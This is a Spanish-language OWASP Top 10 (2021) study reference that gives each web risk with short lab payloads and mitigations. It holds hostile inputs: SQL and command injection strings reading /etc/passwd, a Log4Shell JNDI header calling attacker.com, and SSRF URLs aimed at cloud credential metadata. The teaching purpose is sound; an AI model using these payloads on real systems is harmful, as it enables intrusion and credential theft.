# 🧩 OWASP Top 10 (2021) — Referencia profesional

> **Nivel:** Intermedio → Avanzado · **Fuente:** [OWASP Top 10:2021](https://owasp.org/Top10/)
>
> Referencia operativa: qué es cada riesgo, **cómo se explota** (payloads reales para laboratorio), y **cómo se mitiga**. Pensada para usar en DVWA, Juice Shop, WebGoat o PortSwigger Academy.

---

## Índice

| # | Categoría (2021) | Nombre corto |
|---|---|---|
| A01 | Broken Access Control | Control de acceso roto |
| A02 | Cryptographic Failures | Fallos criptográficos |
| A03 | Injection | Inyección |
| A04 | Insecure Design | Diseño inseguro |
| A05 | Security Misconfiguration | Mala configuración |
| A06 | Vulnerable & Outdated Components | Componentes vulnerables |
| A07 | Identification & Authentication Failures | Fallos de autenticación |
| A08 | Software & Data Integrity Failures | Fallos de integridad |
| A09 | Security Logging & Monitoring Failures | Fallos de logging/monitoreo |
| A10 | Server-Side Request Forgery (SSRF) | SSRF |

---

## A01 — Broken Access Control

El atacante accede a recursos ajenos **cambiando identificadores** sin que el servidor verifique autorización.

**Explotación (IDOR):**

```
# Cambiar el id del perfil
GET /api/v1/profile/1001   → devuelve datos del usuario 1001
GET /api/v1/profile/1002   → devuelve datos de OTRO usuario (sin permiso)
```

**Vertical/horizontal:**

```
# Forzar un rol elevado
GET /admin/panel            → sin check de rol, responde 200
```

**Mitigación:**

- Autorización **en el servidor** por cada recurso (no solo esconder el enlace en el frontend).
- Object-level authorization: verificar que `resource.owner == current_user`.
- Denegar por defecto, usar tokens de referencia indirectos (UUID en vez de IDs secuenciales).
- Tests automáticos de control de acceso (Autorize de Burp).

---

## A02 — Cryptographic Failures

Datos sensibles expuestos por **cifrado ausente o débil**, transmisión insegura, o uso incorrecto de criptografía.

**Señales:**

```
http://sitio.com/login            ← sin TLS
Cookie: session=PHPSESSID=...     ← sin flag Secure/HttpOnly
password almacenado en MD5/SHA1 sin salt
```

**Mitigación:**

- TLS 1.2+ en tránsito (HSTS).
- Cifrar datos en reposo y en backups.
- Hashes robustos para passwords: **Argon2id > bcrypt > scrypt**. Nunca MD5/SHA1.
- Clasificar datos (qué es sensible) antes de decidir el control.

---

## A03 — Injection

Datos del usuario interpretados como código (SQL, OS, LDAP, NoSQL, etc.).

**Explotación SQLi (ver [`sqli-dvwa.md`](../explotacion/sqli-dvwa.md)):**

```
1' OR '1'='1-- -
1' UNION SELECT user, password FROM users-- -
```

**Explotación Command Injection:**

```
# Entrada de un campo "ping"
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
```

**Explotación NoSQLi (MongoDB):**

```json
{ "username": {"$ne": null}, "password": {"$ne": null} }
```

**Mitigación:**

- Parametrización (prepared statements / ORM).
- Validación allowlist + sanitización por contexto.
- Principio de menor privilegio en la cuenta de BD/OS.

---

## A04 — Insecure Design

Riesgos por **fallos en el diseño** de la aplicación (no en la implementación): flujos sin límites de intentos, lógica de negocio débil, ausencia de threat modeling.

**Ejemplos:**

```
# Sin rate-limit en login ni recuperación de contraseña → fuerza bruta
# Flujo de "recuperar password" que permite enumerar usuarios
# Lógica de negocio: cupón de descuento aplicable infinitas veces
```

**Mitigación:**

- Threat modeling desde el diseño (STRIDE, diagramas de flujo de datos).
- Rate limiting, captcha, lockout en flujos sensibles.
- Revisión de lógica de negocio en cada historia de usuario.

---

## A05 — Security Misconfiguration

Configuraciones inseguras por defecto, errores en pantalla, cabeceras faltantes, directorios expuestos.

**Señales:**

```
# Stack traces con rutas internas
# /admin con credenciales por defecto (admin/admin)
# Cabeceras faltantes: X-Content-Type-Options, CSP, etc.
# Puerto de debug abierto (Django debug, Tomcat manager)
```

**Mitigación:**

- Hardening repetible y versionado (scripts, IaC).
- Desactivar features no usados y cuentas por defecto.
- `Security.txt`, cabeceras de seguridad y revisión periódica (ver [`../defensa/checklist-hardening-web.md`](../defensa/checklist-hardening-web.md)).

---

## A06 — Vulnerable & Outdated Components

Uso de librerías/frameworks con **vulnerabilidades conocidas** (CVEs) sin actualizar.

**Señales:**

```
# Log4j 2.14.x → CVE-2021-44228 (Log4Shell)
# Dependencias sin pinning ni SCA (Software Composition Analysis)
```

**Explotación Log4Shell (concepto):**

```
# Header que la app loguea
User-Agent: ${jndi:ldap://attacker.com/exploit}
```

**Mitigación:**

- Inventario de componentes (SBOM).
- SCA continuo: Dependabot, Snyk, Trivy, OWASP Dependency-Check.
- Actualizar en pipeline, no a mano.

---

## A07 — Identification & Authentication Failures

Autenticación rota: credenciales débiles, sesiones predecibles, falta de MFA.

**Señales:**

```
# ID de sesión predecible o expuesto en URL
# Sin límite de intentos de login
# "¿Olvidaste tu contraseña?" con respuestas adivinables (preguntas de seguridad)
```

**Mitigación:**

- MFA (TOTP, WebAuthn).
- Rate limit + lockout + alertas de intentos fallidos.
- Cookies de sesión con `HttpOnly`, `Secure`, `SameSite`, rotación tras login.

---

## A08 — Software & Data Integrity Failures

Integridad rota: actualizaciones sin firma, deserialización insegura, CDNs comprometidos, CI/CD sin verificación.

**Explotación (deserialización insegura — Java):**

```
# Gadget chain que ejecuta código al deserializar
O:8:"Exploit":0:{}
```

**Mitigación:**

- Firmar artefactos y dependencias (Cosign, SLSA).
- No deserializar datos no confiables; usar formatos seguros (JSON con esquema).
- Verificar integridad de recursos de terceros (SRI en CDNs).

---

## A09 — Security Logging & Monitoring Failures

Sin logs de eventos de seguridad, o logs sin monitoreo/alertas → la brecha pasa desapercibida.

**Señales:**

```
# Login exitoso y fallido no se loguean
# Logs sin correlación ni alertas
# Sin retención ni protección contra borrado de logs
```

**Mitigación:**

- Loggear: autenticación, control de acceso (denegaciones), cambios de datos sensibles.
- Formato estructurado (JSON) + timestamp + no datos sensibles en claro.
- SIEM/alertas (Wazuh, Splunk) y respuesta a incidentes definida.

---

## A10 — Server-Side Request Forgery (SSRF)

El servidor hace peticiones a URLs **controladas por el atacante**, accediendo a recursos internos.

**Explotación:**

```
# Campo "url de la imagen" que el servidor descarga
http://169.254.169.254/latest/meta-data/iam/security-credentials/   ← AWS metadata
http://127.0.0.1:8080/admin
file:///etc/passwd
```

**Mitigación:**

- Allowlist de dominios/IPs destino.
- Bloquear IPs internas/metadata (169.254.169.254, 127.0.0.1, ::1, 10.x, 172.16-31.x, 192.168.x).
- Deshabilitar esquemas peligrosos (`file://`, `gopher://`).

---

## 🧭 Mapa rápido de detección

| Categoría | Herramienta | Pista clave |
|---|---|---|
| A01 | Burp (Autorize), navegador | Cambiar IDs → datos ajenos |
| A02 | Burp, testssl.sh | HTTP, hashes débiles |
| A03 | Burp, SQLMap, `'` | Error de sintaxis |
| A04 | Revisión de código | Falta rate-limit/lógica |
| A05 | Nmap, ffuf | Errores en pantalla, `/admin` |
| A06 | Snyk, Trivy, OSV | CVEs en dependencias |
| A07 | Hydra, Burp Intruder | Sin lockout |
| A08 | ysoserial, SRI check | Deserialización |
| A09 | Revisión de logs | Sin logs de seguridad |
| A10 | Burp Collaborator | Petición a metadata interna |

---

## Referencias

- [OWASP Top 10:2021 (oficial)](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [CWE Top 25](https://cwe.mitre.org/top25/)

---

**[← Contexto OWASP](../teoria/01-owasp-top10-contexto.md)** · **[← Volver al módulo](../README.md)**
